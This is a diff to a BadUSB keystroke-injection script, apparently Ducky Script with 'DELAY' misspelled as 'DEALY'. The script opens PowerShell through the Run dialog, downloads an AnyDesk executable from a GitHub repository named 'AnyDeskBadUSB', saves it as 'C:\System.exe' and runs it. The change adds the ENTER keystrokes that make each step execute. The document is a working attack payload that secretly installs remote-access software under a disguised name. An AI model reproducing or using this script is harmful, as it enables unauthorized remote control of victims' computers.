@@ -1,8 +1,10 @@
 GUI r
 DEALY 500
 STRING powershell
+ENTER
 DEALY 1000
 STRING Invoke-WebRequest -Uri 'https://github.com/AnvXprogs/AnyDeskBadUSB/raw/refs/heads/main/AnyDesk%20(2).exe' -OutFile 'C:\\System.exe'
+ENTER
 DEALY 3000
 STRING ./System.exe
-
+ENTER
